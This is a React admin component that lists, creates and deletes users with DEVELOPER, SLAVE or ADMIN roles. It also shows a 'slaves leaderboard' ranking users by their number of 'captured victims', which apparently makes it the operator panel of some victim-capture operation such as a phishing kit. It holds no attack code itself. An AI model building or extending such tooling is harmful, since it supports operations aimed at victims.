import React, { useState, useEffect } from 'react';

function AdminUsers() {
  const [users, setUsers] = useState([]);
  const [leaderboard, setLeaderboard] = useState([]);
  const [form, setForm] = useState({ email: '', password: '', name: '', role: 'DEVELOPER' });

  useEffect(() => {
    const fetchUsers = async () => {
      try {
        const token = localStorage.getItem('jsv_token');
        const response = await fetch(`${process.env.REACT_APP_API_URL}/users`, {
          headers: {
            'Authorization': `Bearer ${token}`,
            'Content-Type': 'application/json',
          },
        });

        if (!response.ok) {
          throw new Error('Error al obtener los usuarios');
        }

        const data = await response.json();
        setUsers(data);
      } catch (error) {
        console.error('Error:', error);
      }
    };

    fetchUsers();
    // Also fetch leaderboard (slaves ordered by victim count)
    const fetchLeaderboard = async () => {
      try {
        const token = localStorage.getItem('jsv_token');
        const res = await fetch(`${process.env.REACT_APP_API_URL}/stats/leaderboard`, { headers: { Authorization: `Bearer ${token}` } });
        if (!res.ok) return;
        const data = await res.json();
        setLeaderboard(data);
      } catch (e) { console.error(e); }
    };
    fetchLeaderboard();
  }, []);

  const handleDelete = async (id) => {
    try {
      const token = localStorage.getItem('jsv_token');
      const res = await fetch(`${process.env.REACT_APP_API_URL}/users/${id}`, {
        method: 'DELETE',
        headers: { Authorization: `Bearer ${token}` },
      });
      if (res.ok) setUsers((u) => u.filter((x) => x.id !== id));
      else console.error('Failed to delete user', await res.text());
    } catch (e) {
      console.error(e);
    }
  };

  const handleChange = (e) => setForm(f => ({ ...f, [e.target.name]: e.target.value }));

  const handleCreate = async (e) => {
    e.preventDefault();
    try {
      const token = localStorage.getItem('jsv_token');
      const res = await fetch(`${process.env.REACT_APP_API_URL}/users`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` },
        body: JSON.stringify(form),
      });
      if (!res.ok) {
        const txt = await res.text();
        throw new Error(txt || 'Failed to create user');
      }
      const created = await res.json();
      setUsers(u => [created, ...u]);
      setForm({ email: '', password: '', name: '', role: 'DEVELOPER' });
    } catch (e) {
      console.error(e);
      alert('Error creating user');
    }
  };

  return (
    <div>
      <h2>Admin Users</h2>
      <section style={{ marginBottom: 16 }}>
        <h3>Slaves leaderboard (by captured victims)</h3>
        {leaderboard && leaderboard.length === 0 && <div>No captures yet.</div>}
        <ol>
          {leaderboard && leaderboard.map((row, idx) => (
            <li key={idx}>{row.user.name || row.user.email} — Captures: {row.count}</li>
          ))}
        </ol>
      </section>
      <form onSubmit={handleCreate} style={{ marginBottom: 12 }}>
        <h3>Create user</h3>
        <input name="email" placeholder="email" value={form.email} onChange={handleChange} required />
        <input name="password" type="password" placeholder="password" value={form.password} onChange={handleChange} required />
        <input name="name" placeholder="name" value={form.name} onChange={handleChange} />
        <select name="role" value={form.role} onChange={handleChange}>
          <option value="DEVELOPER">DEVELOPER</option>
          <option value="SLAVE">SLAVE</option>
          <option value="ADMIN">ADMIN</option>
        </select>
        <button type="submit">Create</button>
      </form>

      <ul>
        {users.map((user) => (
          <li key={user.id}>
            {user.name || '(no name)'} - {user.email} - {user.role}
            {' '}
            <button onClick={() => handleDelete(user.id)}>Delete</button>
          </li>
        ))}
      </ul>
    </div>
  );
}

export default AdminUsers;
